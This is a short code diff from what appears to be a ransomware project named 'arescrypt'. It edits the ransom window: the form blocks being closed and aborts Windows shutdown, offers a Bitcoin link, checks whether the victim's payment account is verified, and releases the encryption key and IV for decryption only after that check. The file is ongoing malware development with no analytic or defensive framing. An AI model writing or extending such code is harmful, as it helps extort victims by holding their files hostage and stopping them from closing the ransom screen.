@@ -88,9 +88,12 @@ namespace arescrypt
 
         private void preventClose(object sender, FormClosingEventArgs e)
         {
-            e.Cancel = true;
-            if (e.CloseReason == CloseReason.WindowsShutDown)
-                Process.Start("shutdown", "-a");
+            if (config.debugMode)
+            {
+                e.Cancel = true;
+                if (e.CloseReason == CloseReason.WindowsShutDown)
+                    Process.Start("shutdown", "-a");
+            }
         }
 
         private void aboutBitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
@@ -105,10 +108,10 @@ namespace arescrypt
         private void checkpaymentBtn_Click(object sender, EventArgs e)
         {
             bool verifiedAccount = accountManager.CheckVerification();
-
+            
             if (verifiedAccount)
             {
-                MessageBox.Show("Account has been verified.");
+                MessageBox.Show("Account has been verified.\nYou may now decrypt your files.");
                 accountManager.GetCryptoKeys();
             }
             else
@@ -117,13 +120,15 @@ namespace arescrypt
 
         private void decryptBtn_Click(object sender, EventArgs e)
         {
-            accountManager.GetCryptoKeys();
-            UserData CryptoKeys = new UserData();
-            CryptoKeys = Miscellaneous.GetDATFileData();
+            UserData CryptoKeys = accountManager.GetCryptoKeys();
 
-            if (userData.encKey != "")
+            if (CryptoKeys.encKey != null && CryptoKeys.encKey != "")
             {
-                MessageBox.Show("Encryption Key: " + CryptoKeys.encKey + "\nEncryption IV: " + CryptoKeys.encIV);
+                var confirm = MessageBox.Show("Would you like to launch decryption?", "Encryption Keys have been recieved.", MessageBoxButtons.YesNo);
+            }
+            else
+            {
+                MessageBox.Show("Account has not been verified.");
             }
         }
     }
